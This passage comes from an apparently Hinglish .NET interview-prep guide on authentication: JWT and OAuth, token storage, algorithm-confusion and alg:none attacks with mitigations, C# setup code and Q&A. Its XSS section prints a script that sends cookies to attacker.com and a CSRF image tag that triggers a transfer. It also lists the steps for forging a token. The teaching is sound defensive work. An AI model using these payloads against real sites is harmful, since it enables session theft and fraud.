| Scalability | Excellent | introspection throughput-bound (short-TTL cache) |
| Info disclosure | Payload readable (unless JWE) | Kuch nahi — meaningless outside issuer |
| Offline verify | Possible | Nahi — hamesha round trip |
| Typical use | Microservice access tokens (high volume) | Refresh tokens always; access when immediate revocation matters (banking) |

**Framing:** binary tech choice nahi — **latency vs revocability trade-off**. Instant guaranteed revocation (financial, admin) → opaque/introspection (ya JWT + mandatory blacklist). Throughput/scale → pure stateless JWT (5–15 min worst-case acceptable). Kai systems hybrid: JWT access (fast, short) + opaque refresh (revocable, long) — yahi source ka pattern.

### 4.3 JWT Validation Pitfalls: Algorithm Confusion & alg:none

- **`alg: none` attack:** spec `alg=none` (unsigned) allow karta hai. Naive verifier token ke `alg` ko trust karke usko dispatch kare → attacker `alg:none`, signature strip, server accept. **Fix:** expected algorithm(s) server config mein pin (`ValidAlgorithms`); `none` unconditionally reject.
- **Algorithm confusion (RS256→HS256 downgrade):** server RS256 verify karta hai *public* key se, par library HS256 bhi accept kar le to:
  1. Server ki public RSA key lo (publicly available, JWKS).
  2. `alg:HS256` token craft, **public key raw bytes ko HMAC secret** ke roop mein use.
  3. Misconfigured server same key material + token ka `alg` trust karke HMAC compute karta hai secret ke saath jo attacker ke paas bhi hai → forged signature verify.

**Fix:** expected algorithm *aur* family server-side fix (token header se independent); symmetric/asymmetric verification paths ke beech key material kabhi interchangeably use na karo. Modern libs (`Microsoft.IdentityModel.Tokens`) default se mitigate — par **configuration discipline** problem hai; explicitly restrict karo, defaults blindly trust mat karo.

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey, // RSA public key
    ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }, // pin — reject HS256/none
    ValidateIssuer = true,
    ValidateAudience = true,
    ValidateLifetime = true,
    ClockSkew = TimeSpan.FromMinutes(2)
};
```

**Q: Code review mein detect kaise?** A: Dekho — koi code jo algorithm ko token se read karke decide kare kaise verify; koi path jo ek hi key object HMAC + RSA dono ke liye use kare; koi explicit disabling of algorithm validation.

### 4.4 CSRF, XSS, Session Fixation — Auth Se Interaction

- **XSS:** attacker malicious JS trusted site mein inject → doosre user ke browser context mein execute → tokens steal / actions.
  ```html
  <script>fetch("https://attacker.com/steal?cookie=" + document.cookie);</script>
  ```
- **CSRF:** malicious site logged-in user ke browser ko trick karke trusted site ko unwanted request bhejta hai. Browser auto cookie attach → server ko legit lagta hai.
  ```html
  <img src="https://bank.com/transfer?to=attacker&amount=10000" />
  ```

| Storage | XSS | CSRF | Mitigation |
|---|---|---|---|
| local/sessionStorage | High (JS-readable) | None | Strong CSP, no unsanitized HTML |
| HttpOnly cookie | Low | Present (auto-attach) | `SameSite=Strict/Lax` ya `None;Secure`+CSRF token, anti-forgery |

- **Session fixation:** attacker victim par *known* session ID force karta hai (link/URL-accepting server) login *se pehle*. Agar login par **fresh** ID issue na ho, attacker ab-authenticated session ride karta hai. **Mitigation:** login ke turant baad session ID regenerate (ya brand-new token issue); session/token ID URL se kabhi accept na karo; server-generated, crypto-random, HttpOnly se bind karo.

**Synthesis:** teenon alag layers — XSS *storage* attack, CSRF *ambient trust* (cookies), fixation *lifecycle* of session IDs. Har ek ka mitigation: XSS→CSP/sanitization, CSRF→SameSite+anti-forgery, fixation→regeneration on privilege change. Sirf HttpOnly cookie XSS-theft solve karta hai par CSRF protection reintroduce karta hai — yahi dual-mode trade-off.

### 4.5 mTLS for Service-to-Service Auth

**mTLS:** normal TLS mein sirf server cert deta hai; mTLS mein **client bhi cert deta hai** + server verify — dono sides handshake par cryptographically authenticate, application-layer se pehle.
- **Kyun:** *calling service* ko transport layer par authenticate (bearer token se independent) — zero-trust internal networks (Istio/Linkerd service mesh), har hop verify.
- **Trade-offs vs bearer tokens:**
  - Certs ko issuance/rotation infra chahiye (mesh sidecar transparently) — client secret rotate karne se heavier.
  - mTLS *service* authenticate karta hai, fine-grained scopes/claims nahi → upar OAuth client credentials/custom claims layer.
  - Common combo: **mTLS (service identity) + OAuth client credentials JWT (authorization)** — defense in depth, either/or nahi.
- **.NET:** Kestrel client cert validation (`RequireCertificate`/`AllowCertificate`); production mein handshake/rotation ko service mesh/gateway delegate karo, hand-roll nahi.

### 4.6 API Keys vs OAuth Client Credentials (M2M)

| | API Key | OAuth Client Credentials |
|---|---|---|
| Prove karta hai | "caller ke paas static secret" | "specific registered client authenticated + scoped time-limited token" |
| Expiry | Usually none | Built-in short-lived |
| Scoping | all-or-nothing (unless custom) | native per-client scopes |
| Revocation | Manual (delete/rotate) | client/token level + short expiry |
| Standardization | bespoke per API | RFC 6749 standard |
| Simplicity | Very simple | More moving parts (token endpoint, JWKS, expiry) |
| Best for | low-risk, quick onboarding, rate-limit/identification | real security, auditability, scoped least-privilege |

**Framing:** API key ek *identification* mechanism (kaun call kar raha) samjho, real *authorization* nahi. Low-stakes ke liye fine; security-sensitive ke liye OAuth Client Credentials (private key JWT/client secret, short-lived, scopes) modern default — cloud providers (Azure AD app registrations, Auth0 M2M) yahi push karte hain.

### 4.7 Performance Considerations

- **JWT per-request DB lookup avoid karta hai** — core win, par free nahi: RS256/ES256 verify HS256 se CPU-heavy; har revocation mitigation (blacklist/versioning/introspection) I/O reintroduce karta hai.
- **Large payloads** har request par network overhead (session cookie small/constant) — claims minimal rakho, extra detail API se fetch.
- **JWKS caching:** verifiers JWKS cache karein (`Cache-Control`), har request fetch nahi; libs (`Microsoft.IdentityModel.Protocols.OpenIdConnect`) `Authority` par auto karti hain (tunable).
- **Introspection calls** = biggest latency cost → short-TTL local cache (revocation immediacy vs throughput trade).
- **Clock skew** chhota (1–2 min) — bahut generous = expired tokens ki effective validity extend; bahut strict = distributed clock drift se spurious failures.

---

## 5. Best Practices

- **Kabhi JWT mein secrets nahi** — no passwords/financial/PII (logs mein plaintext leak assume karo).
- **Access tokens short-lived** — minutes.
- **Hamesha `iss`/`aud`/`exp`/`nbf` validate** — `aud` skip = cross-service replay (common mistake).
- **Asymmetric signing (RS256/ES256)** jab multiple services validate — safer key distribution.
- **Dedicated token-type claim** (`"typ":"access"`/`"token_use":"access"`) — refresh ko access ke roop mein replay na ho.
- **Roles embed karne se scopes prefer** jab roles frequently change — role changes token expire tak effect nahi lete (unless state check); scopes stable.
- **Signing keys rotate** — multiple keys, `kid`, JWKS publish, purani keys tab tak rakho jab tak unse signed tokens expire na ho.
- **Clock skew 1–2 min**, zyada nahi.
- **Hamesha HTTPS.**
- **Tokens kabhi query string mein nahi** — logs/history leak.
- **Refresh tokens har use par rotate + reuse detect** (3.8).
- **Logout aur credential/password change par revoke.**
- **Refresh/token endpoint rate-limit** — brute-force target.
- **Policy-based authorization > scattered role checks.**
- **Secrets managed store mein** (Azure Key Vault/AWS Secrets Manager), `appsettings.json`/source control mein kabhi nahi.

---

## 6. Common Pitfalls

### 6.1 JWT Pitfalls

| Pitfall | Impact | Best Practice |
|---|---|---|
| Long expiry | Stolen tokens long valid | 5–30 min; refresh tokens |
| No revocation | Logout se access invalid nahi | Redis blacklist, refresh revocation, short lifetime |
| Insecure storage (localStorage) | XSS wholesale steal | HttpOnly Secure cookies / BFF |
| Large payloads | Network overhead | Sirf essential claims |
| Validation skip (iss/aud/exp) | Forged/expired accept | Hamesha iss/aud/exp/nbf/signature validate |
| Weak signing keys | Forgeable | Strong secrets / RSA/ECDSA; rotate |
| Clock skew misconfig | Random auth failures | Minimal tolerance (1–2 min) |
| JWT in query string | Logs/history leak | `Authorization` header |
| No HTTPS | Interceptable, replay | HTTPS everywhere |
| Assuming JWT encrypted | Payload readable | Public treat karo; no secrets |

### 6.2 OAuth Pitfalls

| Pitfall | Impact | Best Practice |
|---|---|---|
| Implicit flow for SPAs | Token leak (URL/history) | Auth Code + PKCE |
| Wildcard redirect URI | Token/code hijack | Strict exact allow-listing |
| Client secret in frontend | Impersonation | No secrets in JS/mobile; PKCE for public |
| Over-permissioned scopes | Excessive access on leak | Least-privilege scopes |
| Missing token validation | Unauthorized access | Validate iss/aud/exp/signature |
| No refresh rotation | Replay attacks | Rotate per use |
| Poor revocation | Stolen refresh indefinitely valid | Revocation mechanism |
| OAuth confused with authN | Missing identity guarantees | OIDC for authN, OAuth for delegated authZ |

### 6.3 Refresh Token Pitfalls

| Pitfall | Impact | Best Practice |
|---|---|---|
| Insecure storage | XSS account takeover | HttpOnly Secure cookies; encrypt at rest |
| No rotation | Indefinite access minting | Rotate per refresh |
| Long expiry (months) | Wide attack window | 7–30 days; periodic re-login |
| Not bound to user/device | Replay from attacker device | Device fingerprint/session id binding |
| No revocation on logout/pw change | Post-logout valid | Explicit revoke on both |
| Unlimited active tokens | Session sprawl | Cap sessions; token inventory |
| No replay detection | Silent compromise | Detect reuse; revoke family (3.8) |
| Refresh endpoint not rate-limited | Brute-force | Rate limit + monitor |
| Sent via query string | Logs/history leak | Body or secure cookie only |
| No audit logging | Attacks unnoticed | Log + monitor anomalies |

---

## 7. Implementation Reference (C#)

.NET 8 minimal JWT bearer setup (secrets illustration ke liye inline — **production mein managed secret store**).

**`appsettings.json`:**
```json
{
  "Jwt": {
    "Key": "SUPER_SECRET_KEY_12345",
    "Issuer": "MyCompany.Auth",
    "Audience": "MyCompany.Api",
    "ExpiryMinutes": 30
  }
}
```

**`Program.cs`:**
```csharp
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Text;

var builder = WebApplication.CreateBuilder(args);
var jwtSettings = builder.Configuration.GetSection("Jwt");
var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings["Issuer"],
            ValidAudience = jwtSettings["Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ClockSkew = TimeSpan.FromMinutes(2) // small skew — not TimeSpan.Zero
        };
    });

builder.Services.AddAuthorization();
builder.Services.AddControllers();

var app = builder.Build();
app.UseAuthentication();
app.UseAuthorization();
app.MapControllers();
app.Run();
```

**Token generator service:**
```csharp
public class JwtTokenService
{
    private readonly IConfiguration _config;
    public JwtTokenService(IConfiguration config) => _config = config;

    public string GenerateToken(string userId, string email, string role)
    {
        var jwtSettings = _config.GetSection("Jwt");
        var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);
        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId),
            new(ClaimTypes.Email, email),
            new(ClaimTypes.Role, role),
            new("token_use", "access") // prevents refresh/access confusion
        };
        var credentials = new SigningCredentials(
            new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256);
        var token = new JwtSecurityToken(
            issuer: jwtSettings["Issuer"], audience: jwtSettings["Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(int.Parse(jwtSettings["ExpiryMinutes"]!)),
            signingCredentials: credentials);
        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

**Dual-mode auth (browser=cookie, Postman/mobile=header).** HttpOnly cookies non-browser clients ko invisible hote hain; dono ko ek backend se support:
```csharp
[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    if (!IsValidUser(request)) return Unauthorized();
    var token = _tokenService.GenerateToken("1", "admin@test.com", "Admin");
    // Browser
    Response.Cookies.Append("access_token", token, new CookieOptions
    {
        HttpOnly = true, Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTime.UtcNow.AddMinutes(30)
    });
    // Postman/mobile
    return Ok(new { access_token = token });
}
```
```csharp
.AddJwtBearer(options =>
{
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            var authHeader = context.Request.Headers["Authorization"].FirstOrDefault();
            if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer "))
                context.Token = authHeader["Bearer ".Length..];      // 1: header
            else if (context.Request.Cookies.TryGetValue("access_token", out var c))
                context.Token = c;                                    // 2: cookie
            return Task.CompletedTask;
        }
    };
});
```
Controllers ko special handling nahi:
```csharp
[Authorize]
[HttpGet("orders")]
public IActionResult GetOrders() => Ok("Secure Data");
```

**Production checklist:** HTTPS enforced; CORS credentials allow (cookie flow); `SameSite` Strict/Lax same-domain, `None;Secure` cross-domain; CSRF protection jab cookies; access expiry 10–30 min + refresh token.

**Refresh endpoint (rotation + reuse detection):**
```csharp
[HttpPost("refresh")]
public IActionResult RefreshToken(RefreshRequest request)
{
    var savedToken = _refreshTokenStore.Get(request.RefreshToken);
    if (savedToken is null || savedToken.IsExpired || savedToken.IsConsumed)
    {
        if (savedToken?.IsConsumed == true)   // reuse of rotated token = theft
            _refreshTokenStore.RevokeFamily(savedToken.FamilyId);
        return Unauthorized();
    }
    var newAccessToken = _jwtService.GenerateToken(savedToken.UserId, savedToken.Email, savedToken.Role);
    var newRefreshToken = Guid.NewGuid().ToString();
    _refreshTokenStore.MarkConsumedAndIssueNext(request.RefreshToken, newRefreshToken);
    return Ok(new { accessToken = newAccessToken, refreshToken = newRefreshToken });
}
```

**Policy-based authorization:**
```csharp
builder.Services.AddAuthorization(o =>
    o.AddPolicy("ITOnly", p => p.RequireClaim("Department", "IT")));

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

---

## 8. Sample Interview Q&A

**Q1. JWT validation internally?** Token extract (header/cookie) → correct key select (`kid` from trusted JWKS if asymmetric) → signature verify with *server-configured* algorithm (kabhi token ke `alg` se nahi) → `exp`/`nbf`/`iss`/`aud` validate (small skew) → claims → `HttpContext.User`. Tabhi authorization roles/policies evaluate karta hai. Kisi bhi failure par reject.

**Q2. AuthN vs AuthZ?** AuthN = "kaun ho" (login; identity validate) → fail 401. AuthZ = "kya kar sakte ho" (claims/roles/policies) → fail 403.

**Q3. Basic Auth insecure kyun?** Creds har request, Base64 ≠ encryption, no expiry/revocation, captured request replayable. Legacy/internal compatibility, hamesha HTTPS par.

**Q4. JWT revoke kaise?** Stateless — state add: short access tokens (primary), Redis `jti` blacklist, token versioning, refresh revocation, signing-key rotation (nuclear). Har ek server-side state reintroduce karta hai (statelessness trade-off).

**Q5. JWT vs OAuth?** JWT = token *format*; OAuth 2.0 = *authorization framework* (client tokens obtain/use karke user ke behalf resources access karta hai). OAuth commonly JWT use karta hai but interchangeable nahi.

**Q6. Windows Authentication kab?** Internal enterprise apps AD domain ke andar SSO chahiye. Public internet APIs ke liye nahi (no cross-domain/external, Kerberos/NTLM infra se tied).

**Q7. Microservices communication secure kaise?** Services ke beech JWT (service-specific `aud`), transport-level identity ke liye mTLS, API gateway validation, network isolation — combined (mTLS + JWT), either/or nahi (4.5).

**Q8. Claims vs Roles — better?** Claims fine-grained + scalable; roles coarse + combinatorially multiply. Production default: policy-based authorization built from claims (+ roles jahan appropriate) — decision logic centralize.

**Q9. Token expiration handle kaise?** Short-lived access tokens + refresh-token flow + frontend silent refresh (interceptor) taaki user re-login se interrupt na ho.

**Q10. Replay attacks prevent kaise?** HTTPS everywhere, short lifetime, secret/key rotation, device binding (feasible), critical ops (payments/state-changing) ke liye nonce/idempotency-key tracking.

**Q11. PKCE ab confidential clients ke liye bhi kyun?** Public clients ke liye design tha but redirect-step code interception se bhi defend karta hai regardless of client type; universal use guidance simplify karta hai (no real cost). (3.3)

**Q12. Algorithm confusion attack walk-through?** Server RS256 public key se verify par library HS256 bhi accept kare → attacker HS256 token craft, public RSA key bytes ko HMAC secret ke roop mein use → server incorrectly accept. Mitigation: algorithm(s) server-side pin, token `alg` trust na karo, key material symmetric/asymmetric paths mein share na karo. (4.3)

**Q13. BFF pattern kya + token-in-browser ke upar kyun?** SPA sirf apne backend ke saath plain session cookie; backend OAuth dance server-side karke browser ko koi token expose nahi karta. "JS mein token safely kahan store" problem eliminate, ek extra backend component ki cost par. (3.9)

**Q14. Refresh token reuse detection design kaise?** Har token use ke baad "consumed" mark (delete nahi). Consumed token phir present = theft signal → poori family revoke, full re-auth force (legitimate user logout bhi ho to bhi safer failure mode). (3.8)

---

## Summary of Additions (Guide meta — reference)

Naye `[new content]` sections senior .NET interview level par common hain, original notes mein missing/one-liner the: **2.7** 7 authorization styles (with resource-based), **3.2** grant types (Implicit/ROPC deprecated), **3.5** SAML vs OIDC, **3.8** rotation + reuse detection, **3.9** BFF vs token-in-browser, **3.10** Identity customization, **3.11** multi-tenant, **4.2** opaque vs JWT (latency-vs-revocability), **4.3** alg confusion & alg:none, **4.4** session fixation, **4.5** mTLS, **4.6** API keys vs client credentials, **Q11–Q14**.

**Contradictions flagged during consolidation:**
- Access token lifetime guidance source mein vary karti thi (5–15 / 5–30 / 10–30 / 15–60 min). Conservative rakha: 5–30 min (5–15 preferred), range as note — real systems risk tolerance se vary.
- Ek code sample `ClockSkew = TimeSpan.Zero` tha jabki prose 1–2 min recommend karti thi. Illustrative code `TimeSpan.FromMinutes(2)` mein change kiya (prose + "random clock-skew failures" pitfall se match).

## Summary of [gaps] Additions (Guide meta — reference)

Second pass ke `[gaps]` topics jo 2025/26 senior interviews mein increasingly probe hote hain: **3.12 WebAuthn/FIDO2/Passkeys** — passwordless default (Apple/Google/Microsoft + Entra/Okta); interviewers *kyun phishing-resistant* (origin-bound signatures, no shared secret) probe karte hain vs OTP-MFA (AiTM-vulnerable). **3.13 DPoP (RFC 9449)** — bearer token weakness (steal ke baad fully usable) address karta hai without mTLS ki heavy cert infra; "just use short-lived JWTs" ke baad likely follow-up. Koi aur substantive factual contradiction nahi mila — notes largely consistent repeats/rephrasings.
